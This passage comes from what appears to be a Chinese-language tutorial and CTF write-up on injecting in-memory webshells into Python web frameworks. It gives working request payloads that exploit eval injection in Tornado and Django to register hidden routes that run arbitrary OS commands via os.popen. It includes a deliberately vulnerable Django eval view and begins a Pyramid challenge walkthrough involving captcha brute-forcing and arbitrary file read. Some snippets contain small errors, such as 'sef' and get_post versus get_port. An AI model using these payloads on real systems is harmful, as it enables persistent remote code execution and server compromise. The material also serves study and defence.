<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">type</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;ShellHandler&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">tornado</span><span class="o">.</span><span class="n">web</span><span class="o">.</span><span class="n">RequestHandler</span><span class="p">,),</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;get&#39;</span><span class="p">:</span> <span class="k">lambda</span> <span class="bp">self</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">sef</span><span class="o">.</span><span class="n">get_argument</span><span class="p">(</span><span class="s1">&#39;cmd&#39;</span><span class="p">,</span> <span class="s1">&#39;id&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">())</span> 
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Â∞ÜÊâÄÊúâÂàÜÊûêÁªìÂêàËµ∑Êù•ÔºåÂç≥ÂèØÂú®ÂΩìÂâçÂú∫ÊôØ‰∏ãÊûÑÈÄ†Âá∫‰∏ãÈù¢ÁöÑËØ∑Ê±Çpayload„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">5000</span><span class="o">/</span><span class="err">?</span><span class="n">expression</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">application</span><span class="o">.</span><span class="n">add_handlers</span><span class="p">(</span><span class="s1">&#39;.*&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;/tornado-shell&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="p">(</span><span class="s1">&#39;ShellHandler&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">tornado</span><span class="o">.</span><span class="n">web</span><span class="o">.</span><span class="n">RequestHandler</span><span class="p">,),</span> <span class="p">{</span><span class="s1">&#39;get&#39;</span><span class="p">:</span> <span class="k">lambda</span> <span class="bp">self</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">get_argument</span><span class="p">(</span><span class="s1">&#39;cmd&#39;</span><span class="p">,</span> <span class="s1">&#39;id&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">())})])</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰πãÂêé‰æøÂèØ‰ª•ËÆøÈóÆ <code>/tornado-shell</code> Êù•ÊâßË°å‰ªªÊÑèÁ≥ªÁªüÂëΩ‰ª§„ÄÇ</p>
<h2 id="django">Django
</h2><p>ÊºèÊ¥û‰ª£Á†Å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># memshell/urls.py</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">django.contrib</span> <span class="kn">import</span> <span class="n">admin</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">django.urls</span> <span class="kn">import</span> <span class="n">path</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">.views</span> <span class="kn">import</span> <span class="n">calc</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">urlpatterns</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="n">path</span><span class="p">(</span><span class="s1">&#39;admin/&#39;</span><span class="p">,</span> <span class="n">admin</span><span class="o">.</span><span class="n">site</span><span class="o">.</span><span class="n">urls</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">path</span><span class="p">(</span><span class="s1">&#39;calc&#39;</span><span class="p">,</span> <span class="n">calc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># memshell/views.py</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">django.http</span> <span class="kn">import</span> <span class="n">HttpResponse</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">calc</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">GET</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;expression&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="s1">&#39;&lt;h2&gt;result: </span><span class="si">%s</span><span class="s1">!&lt;/h2&gt;&#39;</span> <span class="o">%</span> <span class="n">result</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËôΩÁÑ∂ <code>Django</code> ÁöÑ‰ª£Á†ÅÁªìÊûÑ‰∏çÂ§™Áõ∏ÂêåÔºå‰ΩÜÁî±‰∫éÊâÄÊúâË∑ØÁî±ÈÉΩÂÆö‰πâÂú® <code>app/urls.py#urlpatterns</code> ‰∏≠ÔºåÊâÄ‰ª•Â§ß‰ΩìÊÄùË∑ØÊ≤°Êúâ‰ªÄ‰πàÂ∑ÆÂà´ÔºåÈ¶ñÂÖàËÄÉËôëÂ¶Ç‰ΩïËé∑ÂèñÂà∞Ëøô‰∏™ÂàóË°®ÔºåÁÑ∂ÂêéÂÜçËøõË°åÊìç‰Ωú„ÄÇ</p>
<p>Âú® <code>Django</code> ‰∏≠Ôºåroot app‰∏ã‰ºöÊúâ‰∏Ä‰∏™ <code>settings.py</code> Êñá‰ª∂Áî®‰∫éÂÆö‰πâÂ∫îÁî®ÈÖçÁΩÆÔºåÂÖ∂‰∏≠ <code>ROOT_URLCONF</code> ÊåáÂÆö‰∫ÜÂΩìÂâçÂ∫îÁî®Ë∑ØÁî±ÂÖ•Âè£ÔºåÂú®ÂΩìÂâçÂú∫ÊôØ‰∏ãÁöÑ <code>ROOT_URLCONF</code> ‰∏∫Ôºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">ROOT_URLCONF</span> <span class="o">=</span> <span class="s1">&#39;memshell.urls&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>È¶ñÂÖàËÄÉËôëÂ¶Ç‰ΩïËé∑ÂèñÂà∞ <code>settings</code> Ëøô‰∏™ÂØπË±°ÔºåÂæóÁõä‰∫éÂΩìÂâçÂú∫ÊôØ‰∏ãÂèØ‰ª•‰ΩøÁî® <code>request</code>ÔºåÊâÄ‰ª•‰ΩøÁî®ÂÖ∂‰∏≠ÂáΩÊï∞ÁöÑ <code>__globals__</code> Â±ûÊÄßÊù•Ëé∑ÂèñÂà∞ÂΩìÂâçÁöÑÂÖ®Â±ÄÂèòÈáèÂ≠óÂÖ∏ÔºåÂÖ∂‰∏≠Â∞±ÂèØ‰ª•ÊâæÂà∞„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/calc?expression=request.get_post.__globals__
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊâæÂà∞<code>memshell.settings</code></p>
<p>importÂØºÂÖ•Â∞±ËÉΩËé∑ÂèñÂà∞app</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/calc?expression=__import__(request.get_post.__globals__[&#34;settings&#34;].ROOT_URLCONF)
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ëé∑ÂèñÂà∞appÂ∞±ËÉΩËé∑ÂèñurlpatternsÊù•Êìç‰ΩúË∑ØÁî±ÂàóË°®‰∫Ü</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/calc?expression=__import__(request.get_post.__globals__[&#34;settings&#34;].ROOT_URLCONF).urls.urlpatterns
</span></span></code></pre></td></tr></table>
</div>
</div><p>Âú®Ë∑ØÁî±ÂÆö‰πâ‰∏≠ÔºåÊØè‰∏ÄÊù°Ë∑ØÁî±ÈÉΩ‰ºöË∞ÉÁî® <code>path</code> ÂáΩÊï∞Êù•ËøõË°åÂÆö‰πâÔºå‰º†ÂÖ•ÁöÑÂèÇÊï∞Áõ∏ÂØπ‰πüÊØîËæÉÁÆÄÂçïÔºåÂ∞±ÊòØ <code>Ë∑ØÁî±ÔºöÂáΩÊï∞</code> ÁöÑÂØπÂ∫îÔºåÁ¨¨‰∏Ä‰∏™Ë∑ØÁî±ÂèÇÊï∞‰∏çÈúÄË¶ÅËÄÉËôëÔºå‰º†ÂÖ•Â≠óÁ¨¶‰∏≤Âç≥ÂèØÔºåÈúÄË¶ÅËÄÉËôëÁöÑÊòØÂ¶Ç‰ΩïÊûÑÈÄ†Á¨¨‰∫å‰∏™ÂèÇÊï∞ÔºåÊü•Áúã <code>path</code> ÂáΩÊï∞ÂÆö‰πâ„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_path</span><span class="p">(</span><span class="n">route</span><span class="p">,</span> <span class="n">view</span><span class="p">,</span> <span class="n">kwargs</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">Pattern</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="kn">from</span> <span class="nn">django.views</span> <span class="kn">import</span> <span class="n">View</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">kwargs</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span> <span class="ow">and</span> <span class="ow">not</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">kwargs</span><span class="p">,</span> <span class="nb">dict</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">TypeError</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="sa">f</span><span class="s2">&#34;kwargs argument must be a dict, but got </span><span class="si">{</span><span class="n">kwargs</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__name__</span><span class="si">}</span><span class="s2">.&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">view</span><span class="p">,</span> <span class="p">(</span><span class="nb">list</span><span class="p">,</span> <span class="nb">tuple</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># For include(...) processing.</span>
</span></span><span class="line"><span class="cl">        <span class="n">pattern</span> <span class="o">=</span> <span class="n">Pattern</span><span class="p">(</span><span class="n">route</span><span class="p">,</span> <span class="n">is_endpoint</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">urlconf_module</span><span class="p">,</span> <span class="n">app_name</span><span class="p">,</span> <span class="n">namespace</span> <span class="o">=</span> <span class="n">view</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">URLResolver</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="n">pattern</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">urlconf_module</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">kwargs</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">app_name</span><span class="o">=</span><span class="n">app_name</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">namespace</span><span class="o">=</span><span class="n">namespace</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">callable</span><span class="p">(</span><span class="n">view</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">pattern</span> <span class="o">=</span> <span class="n">Pattern</span><span class="p">(</span><span class="n">route</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="n">name</span><span class="p">,</span> <span class="n">is_endpoint</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">URLPattern</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">view</span><span class="p">,</span> <span class="n">kwargs</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">view</span><span class="p">,</span> <span class="n">View</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">view_cls_name</span> <span class="o">=</span> <span class="n">view</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__name__</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">TypeError</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="sa">f</span><span class="s2">&#34;view must be a callable, pass </span><span class="si">{</span><span class="n">view_cls_name</span><span class="si">}</span><span class="s2">.as_view(), not &#34;</span>
</span></span><span class="line"><span class="cl">            <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">view_cls_name</span><span class="si">}</span><span class="s2">().&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">TypeError</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;view must be a callable or a list/tuple in the case of include().&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂÖ∂‰∏≠‰ºöÂèëÁé∞ <code>view</code> ÂèÇÊï∞Èô§‰∫ÜÂà§Êñ≠ÊòØÂê¶‰∏∫ <code>View</code>„ÄÅ<code>(list, tuple)</code> ‰πãÂ§ñÔºåËøòÂà§Êñ≠‰∫ÜÊòØÂê¶ÊòØ‰∏Ä‰∏™ÂèØË∞ÉÁî®ÂØπË±°ÔºåÈÇ£‰πàËøôÈáåÂ∞±ÊØîËæÉÁÆÄÂçï‰∫ÜÔºåÁõ¥Êé•ÊûÑÈÄ†‰∏Ä‰∏™ <code>lambda</code> ÂáΩÊï∞Âç≥ÂèØ„ÄÇ</p>
<p>Ê†πÊçÆ‰πãÂâçÁöÑÂàÜÊûêÁªìÊûúÔºåÂèØ‰ª•ÂæóÂà∞‰∏ãÈù¢ÁöÑÊûÑÈÄ†ÊµÅÁ®ãÔºö</p>
<ol>
<li>
<p>Ëé∑Âèñapp.urlpatterns</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">__import__</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">get_port</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s2">&#34;settings&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">ROOT_URLCONF</span><span class="p">)</span><span class="o">.</span><span class="n">urls</span><span class="o">.</span><span class="n">urlpatterns</span>
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>Ë∞ÉÁî®pathÂáΩÊï∞ÔºåËøîÂõû‰∏ÄÊù°Êñ∞Ë∑ØÁî±</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;django&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">urls</span><span class="o">.</span><span class="n">path</span><span class="p">(</span><span class="s1">&#39;shell&#39;</span><span class="p">,</span><span class="k">lambda</span> <span class="n">request</span><span class="p">:</span> <span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;django&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">http</span><span class="o">.</span><span class="n">HttpResponse</span><span class="p">(</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">GET</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;cmd&#39;</span><span class="p">,</span><span class="s1">&#39;id&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">()))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>ÂΩìÂâçÂú∫ÊôØ‰∏ãÈúÄË¶ÅËøîÂõû‰∏Ä‰∏™ <code>http.HttpResponse</code>ÔºåÊâÄ‰ª•ÈúÄË¶ÅÈ¢ùÂ§ñÂºïÂÖ• <code>django</code> Êù•ËøõË°åË∞ÉÁî®</p>
</blockquote>
</li>
<li>
<p>Â∞ÜÊñ∞Ë∑ØÁî±appendÂà∞app.urlpatterns‰∏≠ÂÆûÁé∞ÂÜÖÂ≠òÈ©¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">localhost</span><span class="p">:</span><span class="mi">8000</span><span class="o">/</span><span class="n">calc</span><span class="err">?</span><span class="n">expression</span><span class="o">=</span><span class="nb">__import__</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">get_port</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s2">&#34;settings&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">ROOT_URLCONF</span><span class="p">)</span><span class="o">.</span><span class="n">urls</span><span class="o">.</span><span class="n">urlpatterns</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;django&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">urls</span><span class="o">.</span><span class="n">path</span><span class="p">(</span><span class="s1">&#39;shell&#39;</span><span class="p">,</span><span class="k">lambda</span> <span class="n">request</span><span class="p">:</span> <span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;django&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">http</span><span class="o">.</span><span class="n">HttpResponse</span><span class="p">(</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">GET</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;cmd&#39;</span><span class="p">,</span><span class="s1">&#39;id&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">())))</span>
</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ol>
<p>ÁÑ∂ÂêéËÆøÈóÆ/shell</p>
<h2 id="pyramid">pyramid
</h2><p>Áõ¥Êé•‰∏ä‰æãÈ¢ò</p>
<h3 id="Á¨¨‰∏ÄÂ±äÂõΩÂüéÊùØez_gallery">Á¨¨‰∏ÄÂ±äÂõΩÂüéÊùØez_Gallery
</h3><p>‰∏äÊù•ÂÖàÊòØÂº±Âè£‰ª§ÁàÜÁ†¥ÔºåÊúâÈ™åËØÅÁ†Å</p>
<p>‰∏ãÈù¢Áî®bpÊèí‰ª∂Êù•ÁàÜÁ†¥</p>
<h4 id="xiapao">xiapao
</h4><p>‰ΩøÁî®ÂèÇËÄÉÔºö<a class="link" href="https://blog.csdn.net/qq1140037586/article/details/128455338"  target="_blank" rel="noopener"
    >ÂÖ®ÁΩëÊúÄÊñ∞„ÄÅÊúÄËØ¶ÁªÜÁöÑ‰ΩøÁî®burpsuiteÈ™åËØÅÁ†ÅËØÜÂà´ÁªïËøáÁàÜÁ†¥ÊïôÁ®ãÔºà2023ÊúÄÊñ∞Ôºâ_burpsuiteÁªïËøáÈ™åËØÅÁ†Å-CSDNÂçöÂÆ¢</a></p>
<p>Â°´ÂÖ•ÈìæÊé•‰∏∫È™åËØÅÁ†ÅÂõæÁâáÈìæÊé•ÔºåÁÑ∂ÂêéÂºÄÂêØÊú¨Âú∞È™åËØÅÁ†ÅËØÜÂà´ÊúçÂä°</p>
<p>ÁÑ∂ÂêéÊääÈ™åËØÅÁ†Å‰ΩçÁΩÆÊõøÊç¢‰∏∫ @xiapao@1@</p>
<p>ÊúÄÂêéÂú®ÊääÁ∫øÁ®ãËÆæ‰∏∫ 1 Â∞±ËÉΩÂºÄÂßãÁàÜÁ†¥‰∫Ü</p>
<p>Êé•‰∏ãÊù•Â∞±ÊòØ‰ªªÊÑèÊñá‰ª∂ËØªÂèñ</p>
<p>Áõ¥Êé•ËØªapp.py</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">jinja2</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pyramid.config</span> <span class="kn">import</span> <span class="n">Configurator</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pyramid.httpexceptions</span> <span class="kn">import</span> <span class="n">HTTPFound</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pyramid.response</span> <span class="kn">import</span> <span class="n">Response</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pyramid.session</span> <span class="kn">import</span> <span class="n">SignedCookieSessionFactory</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">wsgiref.simple_server</span> <span class="kn">import</span> <span class="n">make_server</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Captcha</span> <span class="kn">import</span> <span class="n">captcha_image_view</span><span class="p">,</span> <span class="n">captcha_store</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">User</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">username</span> <span class="o">=</span> <span class="n">username</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">password</span> <span class="o">=</span> <span class="n">password</span>
</span></span><span class="line"><span class="cl">
